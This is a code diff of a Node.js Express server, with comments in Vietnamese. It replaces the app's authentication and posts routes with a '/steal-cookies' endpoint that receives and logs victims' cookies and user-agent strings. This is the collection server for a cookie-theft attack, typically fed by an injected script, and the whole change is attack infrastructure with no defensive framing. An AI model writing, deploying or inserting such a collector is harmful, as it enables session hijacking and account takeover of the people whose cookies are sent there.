@@ -14,11 +14,17 @@ app.use(
 app.use(express.json());
 app.use(cookieParser());
 
-// Routes
-app.use('/api/auth', require('./routes/auth'));
-app.use('/api/posts', require('./routes/posts'));
+// Endpoint để nhận và lưu cookies
+app.post('/steal-cookies', (req, res) => {
+  const { cookies, userAgent } = req.body;
+  const timestamp = new Date().toISOString();
 
-const PORT = 5001;
+  // Tạo log entry
+  const logEntry = `[${timestamp}] Cookies: ${cookies}\nUser Agent: ${userAgent}\n\n`;
+  console.log(cookies);
+  res.send('Cookies received');
+});
+const PORT = 5002;
 app.listen(PORT, () => {
   console.log(`Server đang chạy trên port ${PORT}`);
 });
